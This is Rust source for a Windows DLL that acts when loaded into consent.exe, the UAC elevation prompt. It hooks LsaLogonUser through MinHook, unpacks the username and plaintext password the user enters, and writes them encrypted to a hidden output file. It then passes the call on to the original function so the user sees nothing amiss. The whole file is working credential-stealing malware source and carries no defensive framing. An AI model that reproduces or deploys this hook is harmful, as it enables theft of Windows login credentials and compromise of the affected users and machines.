use crypto_common::encrypt_and_log_data_to_file;
use minhook_sys::{MH_CreateHook, MH_EnableHook, MH_Initialize, MH_Uninitialize, MH_OK};

use std::{env::current_exe, ffi::c_void, mem::transmute, ptr::null_mut};

use windows::{
    core::{PCSTR, PWSTR},
    Win32::{
        Foundation::{HANDLE, HINSTANCE, LUID, NTSTATUS},
        Security::{
            Credentials::{
                CredUnPackAuthenticationBufferW, CREDUI_MAX_USERNAME_LENGTH,
                CRED_PACK_PROTECTED_CREDENTIALS,
            },
            QUOTA_LIMITS, TOKEN_GROUPS, TOKEN_SOURCE,
        },
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
        },
    },
};

use std::sync::Once;
use windows_sys::Win32::Security::Authentication::Identity::{LSA_STRING, SECURITY_LOGON_TYPE};

#[cfg(debug_assertions)]
use {
    crypto_common::log_data,
    std::{fmt::format, process},
};

static START: Once = Once::new();

const PUBLIC_KEY: &[u8; 32] = include_bytes!("../../public.key");
const OUTPUT_PATH: &str = env!("OUTPUT_PATH");

static mut ORIGIN_LSA_LOGON_USER: *mut c_void = null_mut();

extern "C" fn lsa_logon_user_hook(
    lsahandle: HANDLE,
    originname: *const LSA_STRING,
    logontype: SECURITY_LOGON_TYPE,
    authenticationpackage: u32,
    authenticationinformation: *const c_void,
    authenticationinformationlength: u32,
    localgroups: *const TOKEN_GROUPS,
    sourcecontext: *const TOKEN_SOURCE,
    profilebuffer: *mut *mut c_void,
    profilebufferlength: *mut u32,
    logonid: *mut LUID,
    token: *mut HANDLE,
    quotas: *mut QUOTA_LIMITS,
    substatus: *mut i32,
) -> NTSTATUS {
    let mut username_size = CREDUI_MAX_USERNAME_LENGTH as u32;
    let mut username = vec![0 as u16; username_size as usize];

    let mut password_size = 256 as u32;
    let mut password = vec![0 as u16; password_size as usize];

    unsafe {
        let result = CredUnPackAuthenticationBufferW(
            CRED_PACK_PROTECTED_CREDENTIALS,
            authenticationinformation,
            authenticationinformationlength,
            PWSTR::from_raw(username.as_mut_ptr()),
            &mut username_size as *mut u32,
            PWSTR::null(),
            None,
            PWSTR::from_raw(password.as_mut_ptr()),
            &mut password_size as *mut u32,
        );
        if result.is_err() {
            #[cfg(debug_assertions)]
            log_data(format!("Failed CredUnpack"));
        }
    };

    let line: Vec<u16> = format!(
        "[consent.exe] Username : {}",
        String::from_utf16_lossy(&username)
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "Failed writing data to file {}\n",
                OUTPUT_PATH.to_string()
            ));
        }
    }

    let line: Vec<u16> = format!(
        "[consent.exe] Password : {}",
        String::from_utf16_lossy(&password)
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "Failed writing data to file {}\n",
                OUTPUT_PATH.to_string()
            ));
        }
    }

    type FnLsaLogonUser = extern "C" fn(
        HANDLE,
        *const LSA_STRING,
        SECURITY_LOGON_TYPE,
        u32,
        *const c_void,
        u32,
        *const TOKEN_GROUPS,
        *const TOKEN_SOURCE,
        *mut *mut c_void,
        *mut u32,
        *mut LUID,
        *mut HANDLE,
        *mut QUOTA_LIMITS,
        *mut i32,
    ) -> NTSTATUS;

    let origin_func: FnLsaLogonUser = unsafe { transmute(ORIGIN_LSA_LOGON_USER) };

    origin_func(
        lsahandle,
        originname,
        logontype,
        authenticationpackage,
        authenticationinformation,
        authenticationinformationlength,
        localgroups,
        sourcecontext,
        profilebuffer,
        profilebufferlength,
        logonid,
        token,
        quotas,
        substatus,
    )
}

fn hook_lsa() {
    unsafe {
        if MH_Initialize() != MH_OK {
            #[cfg(debug_assertions)]
            {
                log_data(format!("PID : {} - Failed MH_Initialize\n", process::id()));
            }
            return;
        }

        let sspicli_handle = GetModuleHandleA(PCSTR("sspicli.dll\0".as_ptr()));
        if sspicli_handle.is_ok() {
            let sspicli_handle = sspicli_handle.unwrap();

            let func = GetProcAddress(sspicli_handle, PCSTR("LsaLogonUser\0".as_ptr()));

            if func.is_some() {
                let func_addr = func.unwrap();
                if MH_CreateHook(
                    func_addr as *mut c_void,
                    lsa_logon_user_hook as *mut c_void,
                    &mut ORIGIN_LSA_LOGON_USER,
                ) != MH_OK
                {
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!(
                            "PID : {} - Failed MH_CreateHook for LsaLogonUser\n",
                            process::id()
                        ));
                    }
                    return;
                }

                if MH_EnableHook(func_addr as *mut c_void) != MH_OK {
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!(
                            "PID : {} - Failed MH_EnableHook for LsaLogonUser\n",
                            process::id()
                        ));
                    }
                    return;
                }
            } else {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed GetModuleHandleA for sspicli.dll",
                        process::id()
                    ));
                }
            }
        }
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(dll_module: HINSTANCE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => START.call_once(|| {
            if let Ok(exe_name) = current_exe() {
                if exe_name.ends_with("consent.exe") {
                    hook_lsa();
                }
            }
        }),
        DLL_PROCESS_DETACH => unsafe {
            if MH_Uninitialize() != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed to uninitialize MinHook",
                        process::id()
                    ));
                }

                return false;
            }
        },
        _ => {}
    }

    true
}
